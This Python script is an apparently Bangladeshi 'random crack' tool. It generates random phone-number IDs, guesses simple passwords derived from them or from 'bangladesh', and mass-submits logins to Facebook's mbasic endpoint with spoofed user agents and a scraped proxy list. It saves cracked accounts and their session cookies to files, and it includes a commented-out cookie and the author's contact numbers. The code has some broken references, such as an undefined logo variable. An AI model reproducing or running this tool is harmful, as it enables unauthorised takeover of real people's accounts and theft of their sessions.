#Script         
#    Respotary   Star  
#----------------------------------------------------------------------------------------------------------
#CREATE BY : ORNIL
#WHATSAPP : +88018*******
#GITHUB : https://github.com/ORNIL-404-CYBER
#----------------------------------------------------------------------------------------------------------
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
from random import Random as _Random
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        
logo =("""

 ██████╗ ██████╗ ███╗   ██╗██╗██╗         
██╔═══██╗██╔══██╗████╗  ██║██║██║         
██║   ██║██████╔╝██╔██╗ ██║██║██║         
██║   ██║██╔══██╗██║╚██╗██║██║██║         
╚██████╔╝██║  ██║██║ ╚████║██║███████╗    
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚══════╝    
                                          
                                    
                                          


\033[33;1m══════════ 😆 𝗙𝗥𝗘𝗘 𝗧𝗢𝗢𝗟 😆 ═════════════\033[33;1m
\033[38;5;46m╔═════════════╗✿◕ ‿ ◕✿\033[38;5;46m╔════════════════╗
\033[38;5;46m║[🙂]\033[33;1m𝗔𝗨𝗧𝗛𝗢𝗥   \033[38;5;46m║    \033[38;5;46m   ║[😎]\033[33;1mORNIL   \033[38;5;46m║
\033[38;5;46m║[😃]\033[33;1m𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 \033[38;5;46m║    \033[38;5;46m   ║[🤓]\033[33;1mORNIL   \033[38;5;46m║
\033[38;5;46m║[😉]\033[33;1m𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 \033[38;5;46m║    \033[38;5;46m   ║[🤠]\033[33;1m01853**** \033[38;5;46m║
\033[38;5;46m║[😇]\033[33;1m𝗚𝗜𝗧𝗛𝗨𝗕   \033[38;5;46m║    \033[38;5;46m   ║[🤗]\033[33;1mORNIL90     \033[38;5;46m║
\033[38;5;46m║[😊]\033[33;1m𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 \033[38;5;46m║    \033[38;5;46m   ║[😌]\033[33;1m01748449919 \033[38;5;46m║
\033[38;5;46m╚═════════════╝✿◕ ‿ ◕✿\033[38;5;46m╚════════════════╝""")

def mumitx():
	print('==================================================')

def Main():
        os.system("clear")
        print(logo)
        print(" [1] RANDOM CRACK")
        print(" [0] Exit")
        Mumit =input("\n [?] Choose : ")
        if Mumit in ["1","01"]:
            fuck()
        if Mumit in [" 0", "00"]:
            exit()
        else:
            exit()
            
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] EXAMPLE CODE: 017, 018, 019, 016')
    code = input('[?] CHOOSE CODE : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('[+] EXAMPLE: 2000 3000 5000 10000 ')
    limit = int(input('[?] CHOOSE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo1)
        tl = str(len(user))
        print('\033[38;5;46m[+] Total ids: '+tl)
        print("\033[38;5;46m[+] Your Code: "+code)
        print('\033[38;5;46m[+] Process has been started')
        print('\033[38;5;46m[+] Use flight mode for speed up')
        print('==================================================')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            yaari.submit(mumit2,uid,pwx,tl)
    print('==================================================')
    print('\033[38;5;46m [+] Crack process has been completed')
    print('\033[38;5;46m [+] OK Ids saved in INNOCENT/OK.txt')
    print('\033[38;5;46m [+] CP Ids saved in INNOCENT/CP.txt')
    print('\033[38;5;46m==================================================')
def mumit2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r\033[1;92m[HRIDOY]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'free.facebook.com',
            "method": 'GET',
            "scheme": 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    # 'cookie': 'datr=_UmUZIJg9jbfyrPZFPfbhekl; sb=_UmUZOO_Po0JEt21V5S7UsP2; vpd=v1%3B644x360x2; dpr=2; wd=980x1753; fr=0vPTUyrbfbbCpHos1.AWV8-FMEOfu-5ulszrH8csUSEME.BklEn9.c6.AAA.0.0.Bkv7QN.AWV_b1xcyfo',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[1;92m[HRIDOY-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/HRIDOY/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[HRIDOY-CP] {cid}|{ps}")
                open('/sdcard/HRIDOY-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
